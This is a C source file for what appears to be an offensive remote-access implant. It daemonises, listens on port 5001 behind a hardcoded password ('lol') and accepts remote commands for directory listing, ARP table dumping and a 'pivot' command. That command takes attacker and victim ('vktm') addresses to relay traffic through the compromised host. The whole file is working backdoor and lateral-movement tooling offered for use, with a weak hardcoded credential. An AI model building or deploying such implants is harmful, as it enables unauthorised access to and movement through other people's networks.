#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <netinet/in.h>
#include <strings.h>
#include <arpa/inet.h>
#include "config.h"
#include <sys/socket.h>
#include <ctype.h>

#ifdef DAEMON
#include <sys/stat.h>
#endif /* DAEMON */

#include "commands.h"
#include "main.h"
#include "dbg.h"

//TODO put SIGTERM cleanup function

int sockfd, newsockfd;

void PREFIX_pivot(char *argv, int argc){
    struct PivotInput in;
    char* pch = NULL;
    char* atk = NULL;
    char* atk_token = NULL;
    char* target = NULL;
    char* target_token = NULL;
    char def[] = "Pivot command usage: pivot attacker_ip:port target_ip:port\n";

    if(argc < 2 || argc > 2){
        check_socket_write(write(newsockfd, &def, strlen(def)));
        return;
    }
    pch = strtok(argv, " ");
    for (unsigned int argv_counter = 0;argv_counter < 2;argv_counter++)                                    //iterate over pch 2 times to get the right number of arguments
    {
        if (argv_counter == 0) {
            check_mem(atk = malloc(strlen(pch) + 1));
            /* Copy attacker ip:port */
            strcpy(atk, pch);
        }
        else if (argv_counter == 1) {
            check_mem(target = malloc(strlen(pch) + 1));
            /* Copy target ip:port */
            strcpy(target, pch);
        }
        pch = strtok(NULL, " ");

    }
    //TODO Convert repeated code to function
    atk_token = strtok(atk,":");
    for (unsigned int attacker_counter = 0; attacker_counter < 2; attacker_counter++){
        if(atk_token == NULL){
            set_zero_errno();
            log_warn("Attacker argument format error");
            goto error;
        }
        if(attacker_counter == 0) {
            if (inet_pton(AF_INET, atk_token, &in.atk_ip) != 1) {
                set_zero_errno();
                log_warn("Attacker ip not valid");
                goto error;
            }
        }
        if(attacker_counter == 1) {
            long int atk_port = strtol(atk_token, NULL, 10);
            if (errno == ERANGE || atk_port == 0) {
                set_zero_errno();
                log_warn("Attacker port not valid");
                goto error;
            }
            else {
                in.atk_port = htons((uint16_t) atk_port);
            }
        }
        atk_token = strtok(NULL,":");
    }
    target_token = strtok(target,":");
    for (unsigned int target_counter = 0; target_counter < 2; target_counter++){
        if(target_token == NULL){
            set_zero_errno();
            log_warn("Target argument format error");
            goto error;
        }
        if(target_counter == 0) {
            if (inet_pton(AF_INET, target_token, &in.vktm_ip) != 1) {
                set_zero_errno();
                log_warn("Target ip not valid");
                goto error;
            }
        }
        if(target_counter == 1) {
            long int target_port = strtol(target_token, NULL, 10);
            if (errno == ERANGE || target_port == 0) {
                set_zero_errno();
                log_warn("Target port not valid");
                goto error;
            }
            else {
                in.vktm_port = htons((uint16_t) target_port);
            }
        }
        target_token = strtok(NULL,":");
    }
    pivot(&in);
    free(atk);
    free(target);

    return;

    error:
        if(atk) free(atk);
        if(target) free(target);
        return;
}

void PREFIX_ext(char *argv, int argc) {
    close(newsockfd);
}

void PREFIX_ls(char *argv, int argc) {
    struct StringArray *result = get_dir_list(argv, argc);
    check(result, "Empty result.");
    for (int count = 0; count < result->count; count++) {
        check_socket_write(write(newsockfd, result->strings[count].string, (size_t) result->strings[count].length));
        check_socket_write(write(newsockfd, "\n", 1));
    }
    free_str_array(result);
    return;

    error:
        return;
}

void PREFIX_arp(char *argv, int argc) {
    ArpResult *resulthole = get_arp(NULL, 0);
    ArpTag *out = resulthole->result;
    unsigned long cnt = resulthole->counter;
    ArpTag *outobj;
    FILE *fd = fdopen(dup(newsockfd), "w");
    ssize_t f = write(newsockfd, "Address    HWtype    HWaddress     Flags Mask      Iface\n", 57);
    if (f <= 0) {
        perror("ERROR writing to socket");
        return;
    }
    for (int counter = 0; counter < cnt; counter++) {
        outobj = &out[counter];
        int n = fprintf(fd, "%s    0x%x    %s     0x%x %s      %s\n",
                        outobj->ip_address,
                        outobj->hw_type,
                        outobj->mac_address,
                        outobj->flags,
                        outobj->mask,
                        outobj->device);
        if (n <= 0) {
            perror("ERROR writing to socket");
            return;
        }
    }
    fflush(fd);
    fclose(fd);
    free(resulthole->result);
    free(resulthole);
}

unsigned int cntargs(char *string)               //space delimited arguments counter
{
    char *pch;                          //delimited token pointer
    char *buffin;                       //temporary buffer to slice pointer
    unsigned int count = 0;                      //arguments counter
    buffin = malloc(strlen(string) + 1);
    check_mem(buffin);  //allocate memory equal to length of string plus one
    strcpy(buffin,
           string);                                 //copy contents of string limited by size of string to buffin
    pch = strtok(buffin,
                 " ");                              //slice the temporary buffer by space and then load the pointer of the first token to pch
    while (pch != NULL)                                    //iterate over pch until no more items
    {
        count++;                                           //increment arguments counter
        pch = strtok(NULL, " ");                          //set the pointer to the next element
    }
    free(buffin);                                          //free the temporary buffer
    return count;                                          //return the count result

    error:
        return 0;
}

void my_switch(char *string) {

    struct commandcase cases[] =
            {
                    {"exit", PREFIX_ext},
                    {"arp",  PREFIX_arp},
                    {"ls",   PREFIX_ls},
                    {"pivot", PREFIX_pivot}
            };
    char *e;
    size_t index;
    char *command;
    bool allocated = false;
    e = strchr(string, ' ');
    if (e != NULL) {
        index = (size_t) (e - string);
        command = malloc(index + 1);
        if (command == NULL)                                     //if we cant allocate memory
        {
            perror("ERROR allocating memory");                 //print error message and
            exit(1);                                           //exit with status code 1
        }
        command[index] = '\0';
        allocated = true;
        strncpy(command, string, index);
        e++;
    }
    else {
        e = NULL;
        command = string;
    }
    unsigned int cntargs_ret;
    for (struct commandcase *pCase = cases; pCase != cases + sizeof(cases) / sizeof(cases[0]); pCase++) {
        if (0 == strcmp(pCase->string, command)) {
            if (e == NULL) {
                (*pCase->func)(e, 0);
                break;
            }
            else {
                cntargs_ret = cntargs(e);
                if (!cntargs_ret) {
                    break;
                }
                (*pCase->func)(e, cntargs_ret);
                break;
            }
        }
    }
    if (allocated) free(command);

}

int main(int argc, char *argv[]) {
    int clilen;
    uint16_t portno;
    char buffer[256];
    struct sockaddr_in serv_addr, cli_addr;
    ssize_t n;

#ifdef DAEMON   //code to daemonize the process
    /* Our process ID and Session ID */
    pid_t pid, sid;
    /* Fork off the parent process */
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    /* If we got a good PID, then
       we can exit the parent process. */
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    /* Change the file mode mask */
    umask(0);
    /* Create a new SID for the child process */
    sid = setsid();
    if (sid < 0) {
        /* Log the failure */
        exit(EXIT_FAILURE);
    }



    /* Change the current working directory */
    if ((chdir("/")) < 0) {
        /* Log the failure */
        exit(EXIT_FAILURE);
    }

    /* Close out the standard file descriptors */
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

#endif /* DAEMON */
    bool socket_opened = false;                     // boolean variable to keep the success/fail state of the call to socket()
    while(!socket_opened) {                         // loop until we successfully open a socket
        /* call to socket() function */
        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        if (sockfd < 0) {                           // socket state check if socket result is negative
            log_err("ERROR opening socket");        // log error
            sleep(5);                               // sleep for 5 seconds
            continue;                               // restart the loop
        }
        else
        {
            socket_opened = true;                   // if we succeed set the socket state variable to true
        }
    }

    /* Initialize socket structure */
    bzero((char *) &serv_addr, sizeof(serv_addr));

    /* Set the port to listen on */
    portno = 5001;
    /* Set the password for login */
    char password[] = "lol";
    /* Set the socket family */
    serv_addr.sin_family = AF_INET;
    /* Set the socket address to listen on */
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    /* set the port to listen on */
    serv_addr.sin_port = htons(portno);

    bool socket_binded = false;                     // boolean variable to keep the success/fail state of the bind() call
    while(!socket_binded) {                         // loop until we successfully bind
        /* Now bind the host address using bind() call.*/
        if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
            log_err("ERROR on binding");            // log error
            sleep(5);                               // sleep for 5 seconds
            continue;                               // restart the loop
        }
        else{
            socket_binded = true;                   // if we succeed set the bind state variable to true
        }
    }

    /* Now start listening for the clients, here process will
    * go in sleep mode and will wait for the incoming connection
    */

    listen(sockfd, 5);
    /* If we have a connection get the size of  sockaddr_in structure */
    clilen = sizeof(cli_addr);
    /* fill with zeroes the buffer we are about to use to get client input */
    bzero(&buffer, 256);
    /* set the welcome message */
    char welcome[] = "Authentication: Success\n";
    /* create and endless loop to interact with the newly established connection */
    while (true) {
        /* Accept actual connection from the client */
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, (socklen_t *) &clilen);
        /* check if we succeed to get the actual connection */
        if (newsockfd <= 0) {           // if not
            log_err("ERROR on accept"); // log error
            continue;                  // restart the loop
        }
        bzero(&buffer, 256);           // fill the used buffer with zero
        n = read(newsockfd, &buffer, 255);  // put stream input to buffer

        if (n <= 0) {                   // check input success
            log_err("ERROR reading from socket"); // log error
            continue;                   // restart the loop
        }

        /* check authentication first */
        if (strcmp(strtok(buffer, "\n"), password) != 0) {
            log_warn("WARN Auth failed.");  // log warning of authentication failure
            close(newsockfd);               // close the offending connection
            continue;                       // restart the loop
        }
        n = write(newsockfd, welcome, strlen(welcome)); // write welcome message

        if (n <= 0) {                           // if we cant write to socket
            log_err("ERROR writing to socket"); // log error
            continue;                           // restart the loop
        }
        FILE *fd = fdopen(dup(newsockfd), "w"); // create a duplicate socket converted after to file descriptor to use fprintf
        n = PRINT_VERSION(fd)                   // macro with fprintf version information, referenced information can be found in config.h.in
        fflush(fd);                             // flush the descriptor
        fclose(fd);                             // close and cleanup
        if (n <= 0) {                           // if we had an error with write
            log_err("ERROR writing to socket"); // log error
            continue;                           // restart the loop
        }

        while (true) {                          // endless loop to receive commands
            bzero(&buffer, 256);                // fill the used buffer with zero
            n = read(newsockfd, &buffer, 255);          // read data from established connection

            if (n <= 0) {
                log_err("ERROR reading from socket");    // if something is wrong with reading
                break;                                  // break the loop kai listen for new connection
            }
            strtok(buffer, "\n");             // if newline has company remove it
            if (strcmp(buffer, "\n") == 0) { // check if input is only new line
                continue;                   // if true listen for new command
            }
            my_switch(buffer);              // if we have text ti process call the processing function

        }
        close(newsockfd);
    }
}
